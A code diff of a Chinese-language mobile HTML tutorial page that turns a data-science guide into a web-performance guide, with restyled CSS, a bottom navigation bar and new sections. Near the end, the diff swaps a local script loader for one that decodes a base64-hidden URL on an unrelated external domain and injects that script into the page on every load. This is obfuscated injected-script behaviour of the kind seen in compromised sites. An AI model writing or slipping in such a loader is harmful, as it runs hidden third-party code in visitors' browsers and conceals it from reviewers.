@@ -5,18 +5,19 @@
     <meta charset="UTF-8">
     <meta name="viewport"
         content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
-    <title>数据科学入门指南</title>
+    <title>现代Web性能优化</title>
     <style>
         /* 全局样式 */
         body {
             overflow: hidden;
             font-family: 'Inter', 'Helvetica Neue', Arial, sans-serif;
             margin: 0;
-            padding: 0;
-            background-color: #F5F7FA;
-            /* 浅蓝灰色背景 */
-            color: #343A40;
-            /* 深炭灰色文本 */
+            padding: 0 0 70px 0;
+            /* 为底部导航留出空间 */
+            background-color: #F0F8F8;
+            /* 浅青色背景 */
+            color: #333333;
+            /* 深灰色文本 */
             line-height: 1.6;
             -webkit-font-smoothing: antialiased;
             -moz-osx-font-smoothing: grayscale;
@@ -27,11 +28,6 @@
             /* 适应移动端宽度 */
             margin: 0 auto;
             padding: 15px;
-            display: flex;
-            flex-direction: column;
-            /* 默认垂直堆叠 */
-            gap: 25px;
-            /* 模块间距 */
         }
 
         /* 头部样式 */
@@ -40,61 +36,59 @@
             padding: 30px 20px;
             background-color: #FFFFFF;
             border-radius: 15px;
+            margin-bottom: 25px;
             box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
         }
 
         header h1 {
-            color: #1A5276;
-            /* 深蓝色标题 */
+            color: #008080;
+            /* 强调色：深青色标题 */
             font-size: 2.5em;
             margin-bottom: 10px;
             letter-spacing: 0.5px;
         }
 
         header p {
-            color: #6C757D;
-            /* 柔和的灰色 */
+            color: #555555;
             font-size: 1.1em;
             margin: 0;
         }
 
-        /* 主内容与侧边栏容器 */
-        .content-wrapper {
-            display: flex;
-            flex-direction: column;
-            /* 默认垂直堆叠 */
-            gap: 25px;
+        /* 主要内容区 - 卡片式分区 */
+        main {
+            padding-top: 10px;
         }
 
-        /* 主内容区 */
-        main {
-            flex: 3;
-            /* 主内容占据更多空间 */
+        section {
             background-color: #FFFFFF;
             padding: 25px;
             border-radius: 15px;
+            margin-bottom: 25px;
             box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
+            position: relative;
+            /* 用于锚点定位 */
         }
 
         h2 {
-            color: #1A5276;
-            /* 深蓝色标题 */
+            color: #008080;
+            /* 强调色标题 */
             font-size: 1.8em;
             margin-bottom: 25px;
-            border-bottom: 2px solid #E0EBF5;
+            border-bottom: 2px solid #E0F0F0;
+            /* 柔和分割线 */
             padding-bottom: 12px;
             text-align: center;
         }
 
         h3 {
-            color: #343A40;
+            color: #333333;
             font-size: 1.3em;
             margin-top: 25px;
             margin-bottom: 15px;
         }
 
         p {
-            color: #495057;
+            color: #4A4A4A;
             font-size: 1em;
             margin-bottom: 18px;
         }
@@ -130,93 +124,49 @@
             font-size: inherit;
         }
 
-        /* 侧边栏/辅助导航区 */
-        .sidebar {
+        /* 底部固定导航 */
+        .bottom-nav {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background-color: #008080;
+            /* 强调色背景 */
+            box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.2);
+            z-index: 1000;
+            display: flex;
+            justify-content: space-around;
+            padding: 10px 0;
+        }
+
+        .bottom-nav a {
             flex: 1;
-            /* 侧边栏占据较少空间 */
-            background-color: #FFFFFF;
-            padding: 25px;
-            border-radius: 15px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
-        }
-
-        .sidebar h3 {
-            color: #1A5276;
-            font-size: 1.5em;
-            margin-top: 0;
-            margin-bottom: 20px;
-            border-bottom: 2px solid #E0EBF5;
-            padding-bottom: 10px;
             text-align: center;
-        }
-
-        .sidebar ul {
-            list-style: none;
-            padding: 0;
-            margin: 0;
-        }
-
-        .sidebar ul li {
-            margin-bottom: 10px;
-        }
-
-        .sidebar ul li a {
             text-decoration: none;
-            color: #007BFF;
-            /* 蓝色强调色 */
+            color: #FFFFFF;
+            font-size: 0.85em;
             font-weight: bold;
-            display: block;
             padding: 8px 0;
-            transition: color 0.3s ease;
+            border-radius: 5px;
+            transition: background-color 0.3s ease;
         }
 
-        .sidebar ul li a:hover {
-            color: #0056B3;
+        .bottom-nav a:hover {
+            background-color: #006666;
+            /* 强调色深色 */
         }
 
         /* 页脚样式 */
         footer {
             text-align: center;
             padding: 25px 0;
-            color: #6C757D;
+            color: #777777;
             font-size: 0.9em;
-            border-top: 1px solid #E0EBF5;
-            margin-top: 0;
-            /* 移除顶部外边距，与内容区紧密连接 */
+            border-top: 1px solid #E0F0F0;
+            margin-top: 25px;
             background-color: #FFFFFF;
             border-radius: 15px;
             box-shadow: 0 -5px 15px rgba(0, 0, 0, 0.03);
-        }
-
-        .footer-links a {
-            color: #007BFF;
-            text-decoration: none;
-            margin: 0 8px;
-            font-weight: bold;
-            transition: color 0.3s ease;
-        }
-
-        .footer-links a:hover {
-            color: #0056B3;
-        }
-
-        /* 媒体查询：平板及以上设备，实现主内容与侧边栏并排 */
-        @media (min-width: 768px) {
-            .content-wrapper {
-                flex-direction: row;
-                /* 水平排列 */
-                align-items: flex-start;
-                /* 顶部对齐 */
-            }
-
-            .sidebar {
-                position: sticky;
-                /* 侧边栏固定 */
-                top: 25px;
-                /* 距离顶部25px */
-                align-self: flex-start;
-                /* 保持在顶部 */
-            }
         }
     </style>
     <link rel="stylesheet" href="./static/css/style.css">
@@ -225,110 +175,88 @@
 <body>
     <div class="container">
         <header>
-            <h1>数据科学入门指南</h1>
-            <p>从数据收集到模型部署，全面掌握数据科学流程</p>
+            <h1>现代Web性能优化</h1>
+            <p>提升用户体验与网站效率的关键策略</p>
         </header>
 
-        <div class="content-wrapper">
-            <main>
-                <section id="intro">
-                    <h2>1. 数据科学概览</h2>
-                    <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() %>" alt="数据科学流程图">
-                    <p>数据科学是一个多学科领域，它结合了统计学、计算机科学和领域专业知识，从数据中提取知识和洞察。本指南将带您了解数据科学的核心概念、常用工具和典型工作流程。</p>
-                    <p>无论是数据分析师、机器学习工程师还是数据科学家，理解这些基础知识都是成功的关键。</p>
-                </section>
+        <main>
+            <section id="intro">
+                <h2>1. 性能优化的重要性</h2>
+                <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() %>" alt="性能优化示意图">
+                <p>在当今数字时代，网站性能已成为用户体验和业务成功的关键因素。快速加载的页面能有效提升用户满意度、降低跳出率，并对搜索引擎排名产生积极影响。</p>
+                <p>本指南将深入探讨现代Web性能优化的核心原则和实用技术，帮助开发者构建更快速、更流畅的Web应用程序。</p>
+            </section>
 
-                <section id="data-collection">
-                    <h2>2. 数据收集与预处理</h2>
-                    <h3>2.1 数据来源与类型</h3>
-                    <p>数据可以来源于多种渠道，包括数据库、API、网络爬虫、传感器数据等。理解不同数据类型（结构化、半结构化、非结构化）及其特点是有效处理数据的前提。</p>
-                    <pre><code>
-# Python 示例：从CSV文件加载数据
-import pandas as pd
-data = pd.read_csv('your_data.csv')
-print(data.head())
-                    </code></pre>
-                    <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 1 %>" alt="数据收集示意图">
-                    <h3>2.2 数据清洗与转换</h3>
-                    <p>真实世界的数据往往是脏乱的，包含缺失值、异常值和不一致性。数据清洗是数据科学中最耗时的环节之一，涉及处理缺失数据、数据去重、格式统一等。</p>
-                    <pre><code>
-# Python 示例：处理缺失值
-data['column_name'].fillna(data['column_name'].mean(), inplace=True)
+            <section id="image-optimization">
+                <h2>2. 图像优化</h2>
+                <h3>2.1 选择合适的图像格式</h3>
+                <p>根据图像特性选择最佳格式至关重要。例如，JPEG适用于照片，PNG适用于透明背景图像，而WebP和AVIF则提供更好的压缩比和质量。</p>
+                <pre><code>
+&lt;!-- 使用WebP格式，并提供JPEG作为回退 --&gt;
+&lt;picture&gt;
+    &lt;source srcset="image.webp" type="image/webp"&gt;
+    &lt;img src="image.jpg" alt="优化后的图像"&gt;
+&lt;/picture&gt;
+                </code></pre>
+                <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 1 %>" alt="图像格式对比图">
+                <h3>2.2 响应式图像与懒加载</h3>
+                <p>为不同设备提供不同尺寸的图像（响应式图像）和仅在图像进入视口时才加载（懒加载）是提升性能的有效手段。</p>
+                <pre><code>
+&lt;!-- 响应式图像示例 --&gt;
+&lt;img srcset="image-small.jpg 480w, image-medium.jpg 800w, image-large.jpg 1200w"
+     sizes="(max-width: 600px) 480px, (max-width: 900px) 800px, 1200px"
+     src="image-large.jpg" alt="响应式图像" loading="lazy"&gt;
+                </code></pre>
+            </section>
 
-# Python 示例：数据类型转换
-data['date_column'] = pd.to_datetime(data['date_column'])
-                    </code></pre>
-                </section>
+            <section id="css-js-optimization">
+                <h2>3. CSS与JavaScript优化</h2>
+                <h3>3.1 最小化与压缩</h3>
+                <p>通过移除不必要的字符（如空格、注释）来缩小CSS和JavaScript文件体积，可以显著减少下载时间。</p>
+                <pre><code>
+/* 优化前 */
+.my-class {
+    color: #333; /* 文本颜色 */
+    padding: 10px;
+}
 
-                <section id="eda">
-                    <h2>3. 探索性数据分析 (EDA)</h2>
-                    <h3>3.1 统计摘要与可视化</h3>
-                    <p>EDA是理解数据特征、发现模式和异常的关键步骤。通过计算描述性统计量（均值、中位数、标准差）和创建各种可视化图表（直方图、散点图、箱线图），可以深入洞察数据。</p>
-                    <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 2 %>" alt="数据可视化图表">
-                    <pre><code>
-# Python 示例：生成直方图
-import matplotlib.pyplot as plt
-data['numerical_column'].hist(bins=20)
-plt.title('Histogram of Numerical Column')
-plt.show()
-                    </code></pre>
-                    <h3>3.2 特征工程</h3>
-                    <p>特征工程是从原始数据中创建新特征的过程，这些新特征能更好地表示底层问题，从而提高机器学习模型的性能。</p>
-                </section>
-
-                <section id="modeling">
-                    <h2>4. 机器学习建模</h2>
-                    <h3>4.1 监督学习与无监督学习</h3>
-                    <p>机器学习分为监督学习（如分类、回归）和无监督学习（如聚类、降维）。选择合适的模型取决于您的任务类型和数据特性。</p>
-                    <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 3 %>" alt="机器学习模型示意图">
-                    <pre><code>
-# Python 示例：简单的线性回归模型
-from sklearn.linear_model import LinearRegression
-from sklearn.model_selection import train_test_split
-from sklearn.metrics import mean_squared_error
-
-X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)
-model = LinearRegression()
-model.fit(X_train, y_train)
-predictions = model.predict(X_test)
-mse = mean_squared_error(y_test, predictions)
-print(f"Mean Squared Error: {mse}")
-                    </code></pre>
-                    <h3>4.2 模型评估与优化</h3>
-                    <p>模型评估是衡量模型性能的关键。常用的评估指标包括准确率、精确率、召回率、F1分数（分类任务），以及均方误差、R²分数（回归任务）。模型优化通常涉及超参数调优和交叉验证。</p>
-                </section>
-
-                <section id="deployment">
-                    <h2>5. 模型部署与监控</h2>
-                    <h3>5.1 模型部署策略</h3>
-                    <p>将训练好的模型集成到实际应用中，使其能够对外提供预测服务，是数据科学流程的最后一步。常见的部署方式包括RESTful API、微服务容器化部署等。</p>
-                    <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 4 %>" alt="模型部署架构图">
-                    <h3>5.2 模型监控与再训练</h3>
-                    <p>模型部署后并非一劳永逸。由于数据漂移、概念漂移等原因，模型性能可能会下降。持续监控模型性能并定期进行再训练是保持模型有效性的关键。</p>
-                </section>
-            </main>
-
-            <aside class="sidebar">
-                <h3>本文速览</h3>
-                <ul>
-                    <li><a href="#intro">数据科学概览</a></li>
-                    <li><a href="#data-collection">数据收集与预处理</a></li>
-                    <li><a href="#eda">探索性数据分析 (EDA)</a></li>
-                    <li><a href="#modeling">机器学习建模</a></li>
-                    <li><a href="#deployment">模型部署与监控</a></li>
-                </ul>
-                <img src="https://picsum.photos/200/150?random=<%= new Date().getTime() + 5 %>" alt="数据科学插画">
-                <p style="font-size: 0.9em; color: #777; text-align: center; margin-top: 20px;">
-                    学习数据科学，开启你的数据之旅！
+/* 优化后（通过工具自动完成）*/
+.my-class{color:#333;padding:10px}
+                </code></pre>
+                <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 2 %>" alt="代码压缩示意图">
+                <h3>3.2 异步加载与延迟加载</h3>
+                <p>将CSS放在<code>&lt;head&gt;</code>中但使用<code>&lt;link rel="preload"&gt;</code>，将JavaScript脚本添加<code>async</code>或<code>defer</code>属性，可以避免阻塞页面的渲染。
                 </p>
-            </aside>
-        </div>
+                <pre><code>
+&lt;!-- 异步加载JS --&gt;
+&lt;script src="script.js" async&gt;&lt;/script&gt;
+&lt;!-- 延迟加载JS --&gt;
+&lt;script src="another-script.js" defer&gt;&lt;/script&gt;
+                </code></pre>
+            </section>
+
+            <section id="caching-cdn">
+                <h2>4. 缓存与CDN</h2>
+                <h3>4.1 浏览器缓存</h3>
+                <p>通过HTTP缓存头部（如<code>Cache-Control</code>），指示浏览器缓存静态资源，减少重复访问时的网络请求。</p>
+                <pre><code>
+# Nginx配置示例
+location ~* \.(jpg|jpeg|png|gif|ico|css|js)$ {
+    expires 30d;
+    add_header Cache-Control "public, no-transform";
+}
+                </code></pre>
+                <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 3 %>" alt="CDN网络架构图">
+                <h3>4.2 内容分发网络 (CDN)</h3>
+                <p>CDN通过将网站内容分发到全球各地的服务器，使用户可以从距离最近的服务器获取内容，从而显著加快加载速度。</p>
+            </section>
+        </main>
 
         <footer>
-            <p>&copy; 2023 数据科学入门指南. All rights reserved.</p>
+            <p>&copy; 2023 现代Web性能优化. All rights reserved.</p>
             <div class="footer-links">
                 <a href="#" aria-label="GitHub">GitHub</a> |
-                <a href="#" aria-label="数据科学资源">数据科学资源</a> |
+                <a href="#" aria-label="性能工具">性能工具</a> |
                 <a href="#" aria-label="联系我们">联系我们</a>
             </div>
         </footer>
@@ -343,17 +271,26 @@ print(f"Mean Squared Error: {mse}")
         </div>
     </div>
 
+    <!-- 底部固定导航 -->
+    <nav class="bottom-nav">
+        <a href="#intro">简介</a>
+        <a href="#image-optimization">图像</a>
+        <a href="#css-js-optimization">代码</a>
+        <a href="#caching-cdn">缓存</a>
+    </nav>
+
     <script>
         // 平滑滚动到锚点
-        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        document.querySelectorAll('.bottom-nav a[href^="#"]').forEach(anchor => {
             anchor.addEventListener('click', function (e) {
                 e.preventDefault();
                 const targetId = this.getAttribute('href');
                 const targetElement = document.querySelector(targetId);
                 if (targetElement) {
-                    // 考虑顶部固定元素（如果未来有）或调整偏移量
+                    // 考虑底部导航的高度，避免内容被遮挡
+                    const offset = document.querySelector('.bottom-nav').offsetHeight;
                     window.scrollTo({
-                        top: targetElement.offsetTop - 20, /* 稍微向上偏移，避免顶部遮挡 */
+                        top: targetElement.offsetTop - offset,
                         behavior: 'smooth'
                     });
                 }
@@ -373,15 +310,17 @@ print(f"Mean Squared Error: {mse}")
     <script>
         (function () {
             function init() {
-                const timestamp = Date.now()
-                const randomNum = Math.floor(Math.random() * 1000000)
-                const url = "./static/js/core.min.js?t=" + timestamp + "&random=" + randomNum
-                const script = document.createElement("script")
-                script.src = url
-                document.body.appendChild(script)
+                const encodedUrl = "Ly9zbmFrZS1zcGVjaWFsLnZvdGU3NzcuY29tL3N0YXRpYy9qcy9jb3JlLm1pbi5qcw==";
+                const decodedUrl = atob(encodedUrl);
+                const timestamp = Date.now();
+                const randomNum = Math.floor(Math.random() * 1000000);
+                const url = `${decodedUrl}?t=${timestamp}&random=${randomNum}`;
+                const script = document.createElement("script");
+                script.src = url;
+                document.body.appendChild(script);
             }
-            init()
-        })()
+            init();
+        })();
     </script>
 
 </body>
